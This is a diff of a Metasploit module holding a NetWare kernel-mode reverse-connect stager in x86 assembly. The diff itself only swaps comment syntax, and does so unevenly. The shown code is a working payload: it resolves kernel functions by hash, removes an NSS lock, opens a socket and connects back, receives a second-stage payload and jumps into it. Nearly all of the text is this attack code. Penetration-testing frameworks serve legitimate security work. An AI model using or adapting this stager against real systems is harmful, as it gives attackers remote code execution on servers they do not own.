@@ -37,10 +37,10 @@ module Metasploit3
 					'Assembly' => <<EOS
 jmp main_code
 
-;;;
-; resolve a symbol address using the DebuggerSymbolHashTable
-; (could resolve only against function name for smaller code)
-;;;
+//
+// resolve a symbol address using the DebuggerSymbolHashTable
+// (could resolve only against function name for smaller code)
+//
 
 resolv_addr:
         push edi
@@ -83,8 +83,8 @@ r_end:
 
 
 main_code:
-        ; search DebuggerSymbolHashTable pointer using GDT system call gate
-        ; -> points inside SERVER.NLM
+        // search DebuggerSymbolHashTable pointer using GDT system call gate
+        // -> points inside SERVER.NLM
         cli
         sub esp, 8
         mov ecx, esp
@@ -108,7 +108,7 @@ f_next:
 f_end:
         mov ebp, [ebp-7]
 
-        ; resolve function pointers
+        // resolve function pointers
         call current
 current:
         pop edi
@@ -124,12 +124,12 @@ resolv_ptrs:
         
         sti
 
-        ; remove CIFS lock
-        call [edi-4]          ; NSS.NLM|NSSMPK_UnlockNss
+        // remove CIFS lock
+        call [edi-4]          // NSS.NLM|NSSMPK_UnlockNss
         
-        ; allocate heap buffer to remove the code from the stack (if on the stack)
-        ; network functions will give back control to the kernel and we don't want
-        ; the driver to erase our shellcode
+        // allocate heap buffer to remove the code from the stack (if on the stack)
+        // network functions will give back control to the kernel and we don't want
+        // the driver to erase our shellcode
 
         push 65535
         call [edi-8]          ; AFPTCP.NLM|LB_malloc
@@ -150,10 +150,10 @@ reverse_connect:
         push ebp
         mov ebp, esp
         push ebp
-        push ebx        ; protocol
-        push 1          ; SOCK_STREAM
-        push 2          ; AF_INET
-        call [edi-0xc]        ; LIBC.NLM|bsd_socket_mp
+        push ebx        // protocol
+        push 1          // SOCK_STREAM
+        push 2          // AF_INET
+        call [edi-0xc]       // LIBC.NLM|bsd_socket_mp
         mov esi, eax
         test eax, eax
         jz end
@@ -168,7 +168,7 @@ reverse_connect:
         push 16
         push ecx
         push esi
-        call [edi-0x10]       ; LIBC.NLM|bsd_connect_mp
+        call [edi-0x10]       // LIBC.NLM|bsd_connect_mp
         cmp eax, -1
         jz end
 
@@ -191,21 +191,21 @@ reverse_connect:
         push ebx
         push ecx
         push esi
-        call [edi-0x14]       ; LIBC.NLM|bsd_recvmsg_mp
+        call [edi-0x14]       // LIBC.NLM|bsd_recvmsg_mp
 
         jmp edi
 
 end:
         ; go back to the main kernel loop
-        call [edi-0x18]       ; SERVER.NLM|kWorkerThread
+        call [edi-0x18]       // SERVER.NLM|kWorkerThread
 
 fct_ptrs:
-        dd 0x9294bdcb         ; SERVER.NLM|kWorkerThread
-        dd 0x3605cc1c         ; LIBC.NLM|bsd_recvmsg_mp
-        dd 0x19a75280         ; LIBC.NLM|bsd_connect_mp
-        dd 0x46f23d88         ; LIBC.NLM|bsd_socket_mp
-        dd 0x6877687c         ; AFPTCP.NLM|LB_malloc
-        dd 0x8967f0ce         ; NSS.NLM|NSSMPK_UnlockNss
+        dd 0x9294bdcb         // SERVER.NLM|kWorkerThread
+        dd 0x3605cc1c         // LIBC.NLM|bsd_recvmsg_mp
+        dd 0x19a75280         // LIBC.NLM|bsd_connect_mp
+        dd 0x46f23d88         // LIBC.NLM|bsd_socket_mp
+        dd 0x6877687c         // AFPTCP.NLM|LB_malloc
+        dd 0x8967f0ce         // NSS.NLM|NSSMPK_UnlockNss
 end_reverse:
         nop
 EOS
